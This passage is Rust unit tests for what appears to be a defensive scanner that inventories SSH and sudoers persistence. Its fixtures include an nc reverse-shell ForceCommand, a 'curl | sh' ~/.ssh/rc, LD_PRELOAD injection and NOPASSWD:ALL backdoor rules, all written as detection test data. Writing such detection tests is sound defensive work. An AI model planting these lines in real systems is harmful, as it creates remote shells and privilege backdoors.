        assert_eq!(forced.raw["comment"], "alice@box");
        assert_eq!(forced.principal.as_deref(), Some("alice"));
        assert_eq!(forced.trigger, Trigger::Login);

        // Identity is the key, not the line: inserting a line above must not
        // move it.
        let before: Vec<String> = keys.iter().map(|e| e.id.clone()).collect();
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "ssh-rsa AAAAAAAAAAAA= inserted@above\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s2 = scan(&d);
        for id in before {
            assert!(s2.entries.iter().any(|e| e.id == id), "an entry id moved when a line was inserted");
        }
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_ten_megabyte_authorized_keys_is_bounded_not_fatal() {
        let d = tree("huge");
        let mut blob = String::new();
        let line = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZZZZZZZZZZZZZZZZZZZZZZZZ user@host\n";
        while blob.len() < 10 * 1024 * 1024 {
            blob.push_str(line);
        }
        put(&d, "home/alice/.ssh/authorized_keys", &blob);
        let s = scan(&d);
        assert!(!s.entries.is_empty(), "the keys it could read are still reported");
        // Every line is the same key, so one entry survives dedup of identical
        // ids only by suffix; what matters is that the read was capped.
        let status = &s.header.collectors[0];
        assert!(
            matches!(status.status, Status::Complete),
            "a capped read is the cap working, not a failure: {:?}",
            status.status
        );
        assert!(
            status.truncated.iter().any(|t| t.contains("authorized_keys")),
            "a 10 MB file must be recorded as read to its cap: {:?}",
            status.truncated
        );
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn hostile_key_lines_do_not_panic() {
        let d = tree("hostilekeys");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"command=\"unterminated ssh-rsa AAAA= x\n");
        bytes.extend_from_slice(b"command= ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa !!!not-base64!!! comment\n");
        bytes.extend_from_slice(b"=,,,==,\n");
        bytes.extend_from_slice(b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 ");
        bytes.extend_from_slice(&[0xff, 0xfe, 0x00, b'\n']);
        put(&d, "home/alice/.ssh/authorized_keys", &bytes);
        let s = scan(&d);
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        let anomalous = s.entries.iter().find(|e| e.has_flag(Flag::EncodingAnomaly));
        assert!(anomalous.is_some(), "the non-UTF-8 comment is evidence");
        assert!(s.entries.iter().any(|e| e.raw.contains_key("key_blob_unparsed")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sshd_config_keywords_are_case_insensitive_take_equals_and_scope_to_match() {
        let d = tree("sshd");
        put(
            &d,
            "etc/ssh/sshd_config",
            "PermitUserEnvironment yes\n\
             #ForceCommand /bin/commented-out\n\
             Include /etc/ssh/sshd_config.d/*.conf\n\
             Match User backdoor\n\
             \tFORCEcommand=/usr/bin/nc -e /bin/sh 10.0.0.1 4444\n\
             \tAuthorizedKeysCommand /usr/local/bin/keys.sh\n",
        );
        put(&d, "etc/ssh/sshd_config.d/10-evil.conf", "SetEnv LD_PRELOAD=/tmp/p.so\n");
        put(&d, "etc/ssh/sshd_config.d/notes.txt", "ForceCommand /bin/ignored-by-glob\n");
        let s = scan(&d);

        let fc = named(&s, "ForceCommand@User backdoor");
        assert_eq!(fc.len(), 1, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        assert_eq!(fc[0].command.as_deref(), Some(&b"/usr/bin/nc -e /bin/sh 10.0.0.1 4444"[..]));
        assert_eq!(fc[0].target_path, Some(PathBuf::from("/usr/bin/nc")));
        assert_eq!(fc[0].raw["match"], "User backdoor");
        assert_eq!(fc[0].principal.as_deref(), Some("backdoor"));

        let ake = named(&s, "AuthorizedKeysCommand@User backdoor");
        assert_eq!(ake.len(), 1, "a Match block scopes everything after it");

        let pue = named(&s, "PermitUserEnvironment");
        assert_eq!(pue.len(), 1);
        assert_eq!(pue[0].raw["match"], "(global)");

        // The glob followed one level, and only what it matched.
        let setenv = named(&s, "SetEnv");
        assert_eq!(setenv.len(), 1);
        assert_eq!(setenv[0].raw["env.LD_PRELOAD"], "/tmp/p.so");
        assert_eq!(
            setenv[0].raw["match"], "(global)",
            "an include outside a Match block stays global"
        );

        // notes.txt is scanned as a drop-in directory member, but the Include
        // glob did not match it; either way it is reported exactly once.
        let ignored = s.entries.iter().filter(|e| e.command.as_deref() == Some(&b"/bin/ignored-by-glob"[..])).count();
        assert_eq!(ignored, 1);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn ssh_login_scripts_and_symlinked_config_are_reported() {
        let d = tree("sshrc");
        put(&d, "etc/ssh/sshrc.real", "#!/bin/sh\nexec /tmp/x\n");
        std::os::unix::fs::symlink("sshrc.real", d.join("etc/ssh/sshrc")).unwrap();
        put(&d, "home/alice/.ssh/rc", "curl http://x | sh\n");
        put(&d, "home/alice/.ssh/environment", "LD_PRELOAD=/home/alice/.evil.so\n# note\n");
        let s = scan(&d);

        let rc = named(&s, "sshrc");
        assert_eq!(rc.len(), 1);
        assert_eq!(rc[0].raw["symlink_target"], "sshrc.real", "a link is evidence, not a detail");
        assert!(rc[0].command.is_none());
        assert_eq!(rc[0].target_path, Some(d.join("etc/ssh/sshrc")));

        let user_rc = named(&s, "ssh-rc");
        assert_eq!(user_rc.len(), 1);
        assert_eq!(user_rc[0].principal.as_deref(), Some("alice"));

        let env = named(&s, "ssh-environment");
        assert_eq!(env[0].raw["env.LD_PRELOAD"], "/home/alice/.evil.so");
        assert_eq!(env[0].enabled, Enablement::Unknown);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudoers_is_a_line_scan_that_follows_one_include_level() {
        let d = tree("sudo");
        put(
            &d,
            "etc/sudoers",
            "Defaults\tenv_reset\n\
             Defaults:alice !authenticate\n\
             User_Alias ADMINS = alice, bob\n\
             Cmnd_Alias SHELLS = /bin/bash, /bin/sh\n\
             root ALL=(ALL:ALL) ALL\n\
             alice ALL=(root) NOPASSWD: /bin/bash, \\\n\
             \t/usr/bin/id\n\
             #1000 ALL=(ALL) NOPASSWD: ALL\n\
             # a real comment\n\
             #includedir /etc/sudoers.d\n\
             #include /etc/sudoers.absent\n",
        );
        put(&d, "etc/sudoers.d/90-cloud", "ubuntu ALL=(ALL) NOPASSWD:ALL\n");
        put(&d, "etc/sudoers.d/evil.conf", "mallory ALL=(ALL) NOPASSWD:ALL\n");
        let s = scan(&d);

        for e in &s.entries {
            if e.kind == Kind::Sudoers {
                assert_eq!(e.raw["analysis"], "line-level");
                assert_eq!(e.trigger, Trigger::Always);
            }
        }

        let alice = s.entries.iter().find(|e| e.name.starts_with("alice:")).unwrap();
        assert_eq!(alice.raw["nopasswd"], "true");
        assert_eq!(alice.raw["tags"], "NOPASSWD");
        assert_eq!(alice.principal.as_deref(), Some("root"));
        assert_eq!(alice.raw["host_list"], "ALL");
        assert_eq!(
            alice.command.as_deref(),
            Some(&b"/bin/bash, \t/usr/bin/id"[..]),
            "the continuation line is part of the same rule"
        );
        assert_eq!(alice.target_path, Some(PathBuf::from("/bin/bash")));

        let uid = s.entries.iter().find(|e| e.name.starts_with("#1000:")).unwrap();
        assert_eq!(uid.raw["nopasswd"], "true");

        let aliases = named(&s, "cmnd_alias:SHELLS");
        assert_eq!(aliases.len(), 1);
        assert_eq!(aliases[0].raw["alias_value"], "/bin/bash, /bin/sh");
        assert!(aliases[0].command.is_none(), "aliases are facts, not resolved policy");

        assert_eq!(
            s.entries.iter().filter(|e| e.raw.contains_key("nopasswd_equivalent")).count(),
            1,
            "Defaults !authenticate is NOPASSWD by another name"
        );

        // The include was followed one level, and the drop-in sudo ignores is
        // reported as inert rather than as an active rule.
        let ubuntu = s.entries.iter().find(|e| e.name.starts_with("ubuntu:")).unwrap();
        assert_eq!(ubuntu.enabled, Enablement::Enabled);
        assert_eq!(
            s.entries.iter().filter(|e| e.name.starts_with("ubuntu:")).count(),
            1,
            "the fixed path and the #includedir must not double-report"
        );
        let mallory = s.entries.iter().find(|e| e.name.starts_with("mallory:")).unwrap();
        assert_eq!(mallory.enabled, Enablement::Disabled);
        assert!(mallory.raw.contains_key("ignored_by_sudo"));

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_missing_includedir_and_invalid_utf8_are_not_failures() {
        let d = tree("sudojunk");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"#includedir /etc/sudoers.does-not-exist\n");
        bytes.extend_from_slice(b"#include /etc/sudoers.also-absent\n");
        bytes.extend_from_slice(b"alice ALL=(ALL) NOPASSWD: /bin/");
        bytes.extend_from_slice(&[0xff, 0xfe]);
        bytes.extend_from_slice(b"\n=\n(\nDefaults\n\\\n");
        put(&d, "etc/sudoers", &bytes);
        let s = scan(&d);

        assert!(
            matches!(s.header.collectors[0].status, Status::Complete),
            "an absent include directory is not an unreadable path: {:?}",
            s.header.collectors[0].status
        );
        let inc = named(&s, "include:/etc/sudoers.does-not-exist");
        assert_eq!(inc.len(), 1);
        assert_eq!(inc[0].target_path, Some(PathBuf::from("/etc/sudoers.does-not-exist")));
        assert!(s.entries.iter().any(|e| e.has_flag(Flag::EncodingAnomaly)));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn empty_root_yields_nothing_and_no_error() {
        let d = tree("empty");
        let s = scan(&d);
        assert!(s.entries.is_empty());
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn fingerprints_match_ssh_keygen() {
        // The empty input's SHA-256, the one fingerprint that is easy to check
        // by hand, plus a real ssh-ed25519 blob.
        assert_eq!(b64_encode(&[]), "");
        assert_eq!(b64_encode(b"a"), "YQ");
        assert_eq!(b64_encode(b"abc"), "YWJj");
        assert_eq!(b64_decode(b"YWJj").unwrap(), b"abc");
        assert!(b64_decode(b"not base64!").is_none());

        let blob = b"AAAAC3NzaC1lZDI1NTE5AAAAIJkBTGfOTNSCBkMmNDIrgX2VXdOdCTr1vAHdGJ3OiRPs";
        let (fp, ok) = fingerprint(blob);
        assert!(ok);
        assert_eq!(fp, "SHA256:FDdeSQ5tHdfDPLTBjVZD+wuRSRc7rABQsZ92BFJrfZk");
    }

    #[test]
    fn glob_matching_is_not_a_prefix_check() {
        assert!(glob_match(b"*.conf", b"10-evil.conf"));
        assert!(!glob_match(b"*.conf", b"notes.txt"));
        assert!(glob_match(b"sshd_config_?", b"sshd_config_1"));
        assert!(glob_match(b"*", b"anything"));
        assert!(!glob_match(b"a*b", b"ab_"));
        assert!(glob_match(b"a*b*c", b"axxbxxc"));
    }

    #[test]
    fn module_paths_are_classified_root_relative() {
        assert!(module_is_standard(b"pam_unix.so"));
        assert!(module_is_standard(b"/lib/security/pam_unix.so"));
        assert!(module_is_standard(b"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"));
        assert!(!module_is_standard(b"/usr/lib/security/../../../tmp/x.so"));
        assert!(!module_is_standard(b"/tmp/x.so"));
        assert!(!module_is_standard(b"./x.so"));
    }

}
